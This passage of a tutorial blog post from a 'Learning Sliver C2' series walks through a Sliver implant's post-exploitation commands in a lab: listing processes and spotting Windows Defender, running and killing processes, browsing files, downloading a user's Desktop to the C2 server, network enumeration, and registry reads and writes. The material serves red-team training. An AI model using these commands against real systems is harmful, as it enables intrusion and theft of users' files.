+</code></pre><p>Time to find out what we can do.
+Below I&rsquo;ll demo various commands and also mention some implementation details whenever possible.
+My review of code was rather quick and I probably got a thing or two wrong, so be warned.
+Sliver is also under active development and some commands may have changed since this was written.
+I recommend you have a look for yourself too.</p>
+<h2 id="processes">Processes</h2>
+<p>When it comes to processes, the first thing everybody want&rsquo;s to have is a list of them.
+You get one using the <code>ps</code> command, whose output can be seen below (in abbreviated form):</p>
+<pre tabindex="0"><code>sliver (myprecious) &gt; ps
+
+[*] Tasked beacon myprecious (137933e6)
+
+[+] myprecious completed task 137933e6
+
+ Pid    Ppid   Owner                    Executable                      Session 
+====== ====== ======================== =============================== =========
+ 0      0                               [System Process]                        
+ 1076   700                             svchost.exe                             
+ 108    4                               Registry                                
+...
+ 980    700                             svchost.exe                             
+ 1960   700                             MsMpEng.exe                             
+ 5804   864    DESKTOP-2CNJ1IR\tester   smartscreen.exe                         
+ 7544   5100   DESKTOP-2CNJ1IR\tester   msedge.exe
+</code></pre><p>Obviously, you can see the basics: PID, Parent PID, the user running the process,
+name of the executable and a session (which was always empty for me).
+You can&rsquo;t see it in the snippet above, but Sliver applies some useful colors to special processes.
+Processes that may become problems for you as an attacker are highlighted in red.
+For me, there were processes <code>1960</code> (Windows Defender) and <code>5084</code> (Windows Smart Screen).
+The names of these products are also shown at the bottom of the output
+(and seem to be based on <a href="https://github.com/BishopFox/sliver/blob/v1.5.16/client/command/processes/ps.go#L38">this list</a>).
+Lastly, process <code>7544</code> was highlighted green, apparently because it was the process hosting the implant
+(<a href="https://github.com/BishopFox/sliver/blob/v1.5.16/client/command/processes/ps.go#L157">source code</a>).
+This is a screenshot of the terminal:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/31_sliver_c2_implant_basics/ps_highlighting.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Highlighting of processes</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>An important thing to know about your current process is the integrity level.
+Basically, all processes on Windows get an access token assigned, which defines their security context.
+Part of that is the integrity level and it allows to restrict access.
+For example, if a process runs as an Administrator user but has a token with &ldquo;Medium&rdquo; integrity,
+it will not be allowed to do everything an Administrator can do.
+You would need to elevate to &ldquo;High&rdquo; integrity first, through a mechanism called &ldquo;User Account Control&rdquo; (UAC).
+This is the big and sometimes annoying prompt you may know that pops up if you do things like installing software.
+Go <a href="https://redcanary.com/blog/process-integrity-levels/">here</a> to read what I think is an accessible overview.</p>
+<p>To get the integrity level of the current process, use the <code>getprivs</code> command
+(<a href="https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/priv/priv_windows.go#L445">source code</a>).
+In addition to the level, it should also list your privileges, akin to what the Windows command <code>whoami /priv</code> shows:</p>
+<pre tabindex="0"><code>sliver (myprecious) &gt; getprivs 
+
+[*] Tasked beacon myprecious (83038513)
+
+[+] myprecious completed task 83038513
+
+Privilege Information for msedge.exe (PID: 7544)
+------------------------------------------------
+
+Process Integrity Level: Medium
+
+Name                            Description                             Attributes
+====                            ===========                             ==========
+</code></pre><p>For me, process integrity levels we reported correctly.
+The list of privileges though was as list of empty lines, which seems to be a bug.
+A <a href="https://github.com/BishopFox/sliver/pull/478">GitHub issue</a> related to the feature confirms
+that there should be a list of privileges.
+Interestingly, I ran this command from a high-integrity process too and the number of empty lines increased.
+This suggests it does detect the privileges and the bug may just be related to the display.</p>
+<p>Of course you can also create a new process.
+Use the <code>execute</code> command to do that, which takes the name of an executable and optionally
+some arguments as input.
+Don&rsquo;t forget the <code>-o</code> flag if you want to see the output of the command.
+For example, this is how to run <code>systeminfo</code>:</p>
+<pre tabindex="0"><code>sliver (myprecious) &gt; execute -o systeminfo
+
+⚠  Using --output in beacon mode, if the command blocks the task will never complete
+
+[*] Tasked beacon myprecious (2283560d)
+
+[+] myprecious completed task 2283560d
+
+[*] Output:
+
+Host Name:                 DESKTOP-2CNJ1IR
+OS Name:                   Microsoft Windows 10 Enterprise Evaluation
+OS Version:                10.0.19044 N/A Build 19044
+...
+</code></pre><p>Look closely at the Windows desktop when <code>systeminfo</code> executes and you&rsquo;ll see a black terminal window popping up
+for a few seconds.
+Things like that could easily make the user of the computer you do this to nervous.
+You have to be careful what kind of program you run this way.</p>
+<p>To kill a process, you can use the <code>terminate</code> command.
+Just provide the PID and the implant will try to make it go away.
+To test this command, start a <code>notepad.exe</code> process, get it&rsquo;s PID and then try to kill it.
+Mine had PID <code>9588</code>.</p>
+<p>If you use <code>terminate</code> from a beacon you will notice that it does not work.
+Sliver tells you to use a session.
+This is one of those cases in which a command is not supported in beacon mode.
+Why is a session required to do this?
+I really could not figure that out.
+To deal with this problem, use <code>interactive</code>, wait for the session and then <code>terminate</code> notepad,
+as illustrated below:</p>
+<pre tabindex="0"><code>sliver (myprecious) &gt; terminate 9588
+
+[!] Please select a session via `use`
+
+sliver (myprecious) &gt; interactive
+
+[*] Using beacon&#39;s active C2 endpoint: https://sliver.labnet.local?driver=wininet
+[*] Tasked beacon myprecious (880d4e06)
+
+[*] Session d600f535 NOBLE_CLUTCH - 192.168.122.32:49899 (DESKTOP-2CNJ1IR) - windows/amd64 - Sun, 23 Oct 2022 20:12:09 CEST
+
+sliver (myprecious) &gt; use d600f535-584d-43f3-bfce-d045bd459dae
+
+[*] Active session NOBLE_CLUTCH (d600f535-584d-43f3-bfce-d045bd459dae)
+
+sliver (NOBLE_CLUTCH) &gt; terminate 9588
+
+[*] Process 9588 has been terminated
+</code></pre><p>Finally, there is also the <code>kill</code> command, with which you can terminate your implant process,
+or in some cases just the thread running it. We&rsquo;ve seen that in previous posts.</p>
+<p>The commands with short descriptions and some links to implementation details are:</p>
+<ul>
+<li><code>ps</code>: Shows a list of processes.
+Implemented based on the
+<a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot">CreateToolhelp32Snapshot</a>
+Windows API (<a href="https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/rpc-handlers_windows.go#L32">command handler</a>
+and <a href="https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/ps/ps_windows.go#L132">main implementation</a>).</li>
+<li><code>geteprivs</code>:
+Shows the process integrity level of the implant process and the privileges.
+Implemented based on the
+<a href="https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation">GetTokenInformation</a>
+Windows API (<a href="https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers_windows.go#L577">command handler</a>
+and <a href="https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/priv/priv_windows.go#L445">main implementation</a>).</li>
+<li><code>execute</code> Creates a new process given an executable and optionally some arguments.
+Implemented based on Golang&rsquo;s <a href="https://pkg.go.dev/os/exec">os/exec package</a>
+(<a href="https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers.go#L398">command handler</a>
+uses the <code>exec.Command</code> function,
+if the <code>--token</code> argument is used there is another
+<a href="https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers_windows.go#L240">command handler</a>
+also using that function, the difference between them may be covered in another post).</li>
+<li><code>terminate</code>: kills as process given a PID.
+Implemented based on Golangs <a href="https://pkg.go.dev/os">os package</a>
+(<a href="https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/rpc-handlers.go#L46">command handler</a>
+and <a href="https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/ps/ps.go#L49">main implementation</a>
+which uses <code>os.FindProcess</code> to get a process struct <code>p</code>, then <code>p.Kill</code> to kill it).</li>
+<li><code>kill</code>: kills the current beacon or session.
+Implemented as a special handler on Windows.
+For DLL or shellcode implants, it does the following:
+If the <code>--force</code> flag is set, it calls
+<a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitprocess">ExitProcess</a>
+from <code>kernel32.dll</code>,
+else it called
+<a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitthread">ExitThread</a>
+(<a href="https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/special-handlers_windows.go#L50">command handler</a>).
+For other implants, it just uses Golangs <a href="https://pkg.go.dev/os">os package</a> to <code>Exit</code>, i.e., kill the current process.</li>
+</ul>
+<h2 id="files">Files</h2>
+<p>Sliver implants let you explore the file system in the same way a normal shell would.
+The command syntax follows normal Linux conventions.
+That is, there is <code>ls</code>, <code>cd</code>, <code>cat</code> and so on.
+For example, list files of a directory with <code>ls</code>:</p>
+<pre tabindex="0"><code>sliver (myprecious) &gt; ls C:/Windows
+
+[*] Tasked beacon myprecious (f1a98695)
+
+[+] myprecious completed task f1a98695
+
+C:\Windows (104 items, 11.7 MiB)
+================================
+drwxrwxrwx  addins                            &lt;dir&gt;      Sat Dec 07 02:50:12 -0700 2019
+drwxrwxrwx  appcompat                         &lt;dir&gt;      Sun Aug 21 10:59:48 -0700 2022
+...
+-rw-rw-rw-  system.ini                        219 B      Sat Dec 07 02:12:42 -0700 2019
+...
+</code></pre><p>Found a file you&rsquo;re interested in?
+Print it&rsquo;s content with <code>cat</code>:</p>
+<pre tabindex="0"><code>sliver (myprecious) &gt; cat C:/Windows/system.ini
+
+[*] Tasked beacon myprecious (1bcc51b9)
+
+[+] myprecious completed task 1bcc51b9
+
+; for 16-bit app support
+[386Enh]
+woafont=dosapp.fon
+EGA80WOA.FON=EGA80WOA.FON
+EGA40WOA.FON=EGA40WOA.FON
+CGA80WOA.FON=CGA80WOA.FON
+CGA40WOA.FON=CGA40WOA.FON
+
+[drivers]
+wave=mmdrv.dll
+timer=timer.drv
+
+[mci]
+</code></pre><p>Your file-related commands can take an absolute path as input or one relative to the current working directory.
+Get this directory with <code>pwd</code>:</p>
+<pre tabindex="0"><code>sliver (myprecious) &gt; pwd
+
+[*] Tasked beacon myprecious (a6e4f071)
+
+[+] myprecious completed task a6e4f071
+
+[*] C:\Program Files (x86)\Microsoft\Edge\Application\106.0.1370.42
+</code></pre><p>You can change the current working directory with <code>cd</code>.
+But beware, this command does not merely store a directory somewhere inside the implant.
+<code>cd</code> may look like a convenience feature it is really not.
+It actually changes the current working directory of the process,
+which may or may not be what you want to achieve.
+If a process somehow relies on it&rsquo;s working directory, you may break it.</p>
+<p>To see how the working directory changes, observe the process with Process Hacker while using <code>cd</code>:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/31_sliver_c2_implant_basics/cwd_changed.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Process Hacker says the current working directory of the process changed</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Rather than just looking at files and folders, you may also want to download some of them.
+The <code>download</code> command is what you can use for that.
+Either give it a path to the file you want, or if there are many of them then just
+give it a path to a directory.
+For example, you can download everything from a user&rsquo;s Desktop like this:</p>
+<pre tabindex="0"><code>sliver (myprecious) &gt; download C:/Users/tester/Desktop
+
+[*] Tasked beacon myprecious (a6e4f071)
+
+[+] myprecious completed task a6e4f071
+
+[*] Wrote 11952835 bytes to /home/kali/Desktop.tar.gz
+</code></pre><p>Note that this command downloads the files to the computer running the Sliver client,
+which is not necessarily the C2 server (in my simple setup though it is).
+This seems to be the case for most other commands that output files too.
+However, you can often pass a flag <code>--loot</code> in such cases.
+If you do, the C2 server will store the files and you do not get a local copy.
+However, you can explore all looted files with the <code>loot</code> command.
+The advantage is that all operators can see the files and grab local copies if needed.
+E.g., run <code>loot fetch -s /tmp/myfile</code> to download one (there will be an interactive prompt
+for you to select a file).</p>
+<p>There are many more commands. For example, you can also <code>upload</code> a file
+or <code>mkdir</code> a directory.
+Here is a list with short descriptions and some links to implementation details:</p>
+<ul>
+<li><code>pwd</code>: Shows the current working directory of the process.
+Implemented based on Golang&rsquo;s <a href="https://pkg.go.dev/os">os package</a>
+(<a href="https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers.go#L254">command handler</a>
+uses the <code>os.Getwd</code> function).</li>
+<li><code>ls</code>: Shows a directory listing for a given path.
+Implemented based on Golang&rsquo;s <a href="https://pkg.go.dev/io/ioutil">io/ioutil package</a>
+(<a href="https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers.go#L85">command handler</a>
+uses the <code>ioutil.ReadDir</code> function).</li>
+<li><code>cd</code>: Changes the current working directory of the process hosting the implant.
+Implemented based on Golang&rsquo;s <a href="https://pkg.go.dev/os">os package</a>
+(<a href="https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers.go#L227">command handler</a>
+uses the <code>os.Chdir</code> function).</li>
+<li><code>download</code> downloads single files or <code>.tar.gz</code> archives of directory subtrees.
+Implemented based on various Golang packages.
+(<a href="https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers.go#L227">command handler</a>
+uses native Golang functions to read files or walk over directory subtrees).</li>
+<li><code>cat</code> Prints the content of a file to stdout.
+Implemented by using the <code>download</code> command under the hood
+(see <a href="https://github.com/BishopFox/sliver/blob/v1.5.16/client/command/filesystem/cat.go#L41">client command</a> code).</li>
+<li><code>upload</code> uploads a single file.
+Implemented based on Golang&rsquo;s <a href="https://pkg.go.dev/os">os package</a>
+(<a href="https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers.go#L346">command handler</a>
+creates a file with <code>os.Create</code> to then <code>Write</code> to it).</li>
+<li><code>mv</code> renames files or directories.
+Implemented based on Golang&rsquo;s <a href="https://pkg.go.dev/os">os package</a>
+(<a href="https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers.go#L181">command handler</a>
+uses Golang&rsquo;s <code>os.Rename</code> function).</li>
+<li><code>mkdir</code> creates a new directory (and all necessary parents if they do not yet exist).
+Implemented based on Golang&rsquo;s <a href="https://pkg.go.dev/os">os package</a>
+(<a href="https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers.go#L203">command handler</a>
+uses Golang&rsquo;s <code>os.MkdirAll</code> function with hardcoded permissions <code>700</code>,
+which <a href="https://pkg.go.dev/os#Chmod">should</a> give the current user full control over it).</li>
+<li><code>rm</code> deletes a file or directory, optionally with recursion (<code>-r</code> flag)
+Implemented based on Golang&rsquo;s <a href="https://pkg.go.dev/os">os package</a>
+(<a href="https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers.go#L140">command handler</a>
+uses Golang&rsquo;s <code>os.Remove</code> or <code>os.RemoveAll</code> functions).</li>
+</ul>
+<p>Warning: sometimes errors might not be communicated.
+For example, when I tried to move a file to a place I was not allowed to write to,
+the implant simply confirmed task execution.
+Nothing was moved though.</p>
+<h2 id="network">Network</h2>
+<p>Sliver implants can show you network interfaces and currently existing connections.
+To see the interfaces, use <code>ifconfig</code> (add <code>-A</code> to show all,
+which includes boring ones like loopback which are otherwise filtered):</p>
+<pre tabindex="0"><code>sliver (myprecious) &gt; ifconfig 
+
+[*] Tasked beacon myprecious (a4d3896c)
+
+[+] myprecious completed task a4d3896c
+
++--------------------------------------------+
+| Ethernet 2                                 |
++--------------------------------------------+
+|  # | IP Addresses      | MAC Address       |
++----+-------------------+-------------------+
+| 13 | 192.168.122.32/24 | 52:54:00:d7:7e:9e |
++--------------------------------------------+
+1 adapters not shown.
+</code></pre><p>To enumerate network connections, use the <code>netstat</code> command.
+By default, it shows you connections in a state other than <code>LISTEN</code>:</p>
+<pre tabindex="0"><code>sliver (myprecious) &gt; netstat
+
+[*] Tasked beacon myprecious (4f333770)
+
+[+] myprecious completed task 4f333770
+
+ Protocol   Local Address             Foreign Address         State         PID/Program Name   
+========== ========================= ======================= ============= ====================
+ tcp        192.168.122.32:49:49832   192.168.122.111:8:80    ESTABLISHED   7544/msedge.exe    
+ tcp        192.168.122.32:49:49884   40.113.110.67:443:443   ESTABLISHED   3032/svchost.exe   
+ tcp        192.168.122.32:49:49951   204.79.197.203:44:443   ESTABLISHED   5448/SearchApp.exe 
+ tcp        192.168.122.32:49:49955   2.21.133.19:443:443     CLOSE_WAIT    5448/SearchApp.exe 
+ tcp        192.168.122.32:49:49956   2.21.133.19:443:443     CLOSE_WAIT    5448/SearchApp.exe 
+ tcp        192.168.122.32:49:49957   2.21.133.192:443:443    CLOSE_WAIT    5448/SearchApp.exe
+...
+</code></pre><p>Observers with an eye for details may notice that the addresses look strange.
+The port seems to be printed twice. In some cases, only some digits
+of the first occurrence of the port are shown.
+To me it looks as if the intended format is <code>IP:PORT</code> but the IP has the port appended
+to it already and is then capped at 17 characters before appending the port again.
+Just ignore the first occurrence of the port and you are good.</p>
+<p>You can also get those connections that are in state <code>LISTEN</code> by passing the <code>--listen</code> flag:</p>
+<pre tabindex="0"><code>sliver (myprecious) &gt; netstat --listen
+
+[*] Tasked beacon myprecious (4c598a23)
+
+[+] myprecious completed task 4c598a23
+
+ Protocol   Local Address           Foreign Address   State    PID/Program Name 
+========== ======================= ================= ======== ==================
+ tcp        0.0.0.0:135:135         0.0.0.0:0:0       LISTEN   980/svchost.exe  
+ tcp        0.0.0.0:445:445         0.0.0.0:0:0       LISTEN   4/System         
+ tcp        0.0.0.0:5040:5040       0.0.0.0:0:0       LISTEN   4840/svchost.exe 
+ tcp        0.0.0.0:7680:7680       0.0.0.0:0:0       LISTEN   2168/svchost.exe 
+ tcp        0.0.0.0:49664:49664     0.0.0.0:0:0       LISTEN   728/lsass.exe    
+ tcp        0.0.0.0:49665:49665     0.0.0.0:0:0       LISTEN   576/wininit.exe  
+ tcp        0.0.0.0:49666:49666     0.0.0.0:0:0       LISTEN   1172/svchost.exe 
+ tcp        0.0.0.0:49667:49667     0.0.0.0:0:0       LISTEN   1364/svchost.exe 
+ tcp        0.0.0.0:49668:49668     0.0.0.0:0:0       LISTEN   2524/spoolsv.exe 
+ tcp        0.0.0.0:49669:49669     0.0.0.0:0:0       LISTEN   700/services.exe 
+ tcp        192.168.122.32:13:139   0.0.0.0:0:0       LISTEN   4/System         
+</code></pre><p>There are several flags for <code>netstat</code>. By default it seems to show TCP only (<code>--tcp</code>),
+but you can pass <code>--udp</code> to get information on that too.
+Moreover, you can get <code>--ip4</code> and <code>--ip6</code> connections.</p>
+<p>Both commands with short descriptions and some links to implementation details are:</p>
+<ul>
+<li><code>ifconfig</code>: Shows the current working directory of the process.
+Implemented based on Golang&rsquo;s <a href="https://pkg.go.dev/net">net package</a>.
+(<a href="https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/rpc-handlers.go#L139">command handler</a>
+uses Golang&rsquo;s <code>net.Interfaces</code> function).</li>
+<li><code>netstat</code>: Shows lists of TCP/UDP IPv4/IPv6 connections, either those listening (<code>--listen</code>) or all others.
+Implemented based on various Windows API calls from <code>Iphlpapi.dll</code> to read connection tables
+and <code>Kernel32.dll</code> to read process names.
+(<a href="https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/rpc-handlers.go#L195">command handler</a>
+uses a dedicated <a href="https://github.com/BishopFox/sliver/tree/v1.5.16/implant/sliver/netstat">netstat</a>
+package, see underlying API calls <a href="https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/netstat/netstat_windows.go#L49">here</a>).</li>
+</ul>
+<h2 id="windows-registry">Windows Registry</h2>
+<p>Sliver can interact with the Windows registry too, using a family of <code>registry</code> commands.</p>
+<p>The Windows Registry is a database of system settings and consists of keys and values.
+Think of it as trees of keys where each key can have other subkeys or values associated with it.
+A key has a name while a value has a name and data.
+Data is strongly typed and
+<a href="https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-value-types">valid types</a>
+include <code>REG_DWORD</code> (a 32-bit number) or <code>REG_SZ</code> (a string).
+At the highest level, there are seven root keys called the
+<a href="https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives">registry hives</a>.
+An example is <code>HKEY_LOCAL_MACHINE</code>, abbreviated as <code>HKLM</code>.</p>
+<p>Sliver implants provide elementary commands to read, list and write both keys and values.
+For example, let&rsquo;s use the <code>registry read</code> command to get the product name of the Windows system.
+You can get the value <code>ProductName</code> from the path <code>software\microsoft\windows nt\currentversion</code>
+in the hive <code>HKLM</code> in this way:</p>
+<pre tabindex="0"><code>sliver (myprecious) &gt; registry read -H HKLM &#34;software\microsoft\windows nt\currentversion\ProductName&#34;
+
+[*] Tasked beacon myprecious (e8bacf0b)
+
+[+] myprecious completed task e8bacf0b
+
+Windows 10 Enterprise Evaluation
+</code></pre><p>To list all values available at that path in the hive <code>HKLM</code>, run:</p>
+<pre tabindex="0"><code>sliver (myprecious) &gt; registry list-values -H HKLM &#34;software\microsoft\windows nt\currentversion&#34;
+
+[*] Tasked beacon myprecious (e8bacf0b)
+
+[+] mypreciouse8bacf0b completed task e8bacf0b
+
+[*] Values under HKLM:\software\microsoft\windows nt\currentversion:
+SystemRoot
+BaseBuildRevisionNumber
+BuildBranch
+BuildGUID
+...
+ProductName
+...
+</code></pre><p>Several other commands exist that allow you to explore the registry trees as well as to
+create new keys and write values:
+Below you find all commands with short descriptions and some links to implementation details.
+All of them accept a flag <code>--hive</code> which can be <code>HKCU</code> (default), or <code>HKLM</code>, or any other.
+They also accept a <code>--hostname</code>,  i.e., you could access the registry of a remote host.</p>
+<ul>
+<li><code>registry read</code>: Read a value
+(<a href="https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers_windows.go#L487">command handler</a>).</li>
+<li><code>registry write</code>: Write a value
+(<a href="https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers_windows.go#L457">command handler</a>).</li>
+<li><code>registry create</code>: Create a new subkey
+(<a href="https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers_windows.go#L505">command handler</a>).</li>
+<li><code>registry delete</code>: Delete a key
+(<a href="https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers_windows.go#L522">command handler</a>).</li>
+<li><code>registry list-subkeys</code>: List all subkeys of a given key
+(<a href="https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers_windows.go#L539">command handler</a>).</li>
+<li><code>registry list-values</code>: List all values of a given key
+(<a href="https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers_windows.go#L558">command handler</a>).</li>
+</ul>
+<p>All commands are implemented in a dedicated
+<a href="https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/registry/registry_windows.go">registry package</a>,
+which is a thin wrapper around the Golang library
+<a href="https://pkg.go.dev/golang.org/x/sys/windows/registry">golang.org/x/sys/windows/registry</a>.
+This library uses various Windows API functions from <code>advapi32.dll</code> and <code>kernel32.dll</code>, lazily loaded
+on demand
+[see <a href="https://github.com/golang/sys/blob/95e765b1cc43ac521bd4fd501e00774e34401449/windows/registry/zsyscall_windows.go#L41">source code</a>].</p>
+<p>All commands allow specifying a remote host,
+which is a feature of the underlying Golang library and provided by the function
+<a href="https://pkg.go.dev/golang.org/x/sys/windows/registry#OpenRemoteKey">OpenRemoteKey</a>.
+It uses the Windows API <a href="https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regconnectregistryw">RegConnectRegistryW</a>
+from <code>Advapi32.dll</code> to connect, which is why it should use your current user&rsquo;s credentials.</p>
+
+    </div>
+    
+    <footer>
+      <hr>
+      <p>
+  Published
+  
+    
+      by <span itemprop="author">Dominic Breuker</span>
+    
+  
+  <time itemprop="datePublished" datetime="2022-10-24T00:00:00&#43;00:00">
+    24 Oct, 2022
+  </time>
+  
+    in <span itemprop="articleSection"><a href="/categories/c2/">c2</a> and <a href="/categories/sliver/">sliver</a></span>
+  
+  
+    and tagged <a href="/tags/c2/">c2</a>, <a href="/tags/commands/">commands</a>, <a href="/tags/implant/">implant</a>, <a href="/tags/registry/">registry</a>, <a href="/tags/sliver/">sliver</a> and <a href="/tags/tutorial/">tutorial</a>
+  
+  using <span itemprop="wordCount">4156</span> words.
+</p>
+
+      
+
+
+  <aside>
+    <header>Related Content</header>
+    <ul>
+      
+        <li><a href="/post/learning_sliver_c2_06_stagers_process_injection/">Learning Sliver C2 (07) - Stagers: Process Injection</a>
+        <time datetime="21M">21 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_06_stagers/">Learning Sliver C2 (06) - Stagers: Basics</a>
+        <time datetime="25M">25 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_05_transports_in_detail_dns/">Learning Sliver C2 (05) - Transports in Detail: DNS</a>
+        <time datetime="9M">9 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_04_transports_in_detail_http_and_https/">Learning Sliver C2 (04) - Transports in Detail: HTTP and HTTPS</a>
+        <time datetime="18M">18 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_03_transports_in_detail_mtls_and_wg/">Learning Sliver C2 (03) - Transports in Detail: mTLS and WireGuard</a>
+        <time datetime="11M">11 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_02_beacons_and_sessions/">Learning Sliver C2 (02) - Beacons and Sessions</a>
+        <time datetime="13M">13 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_01_installation/">Learning Sliver C2 (01) - Tutorial / Installation</a>
+        <time datetime="8M">8 minutes</time>
+      
+    </ul>
+  </aside>
+
+
+    </footer>
+  </article>
+</main>
+    <footer>
+  
+
+</footer>
+  </body>
+</html>
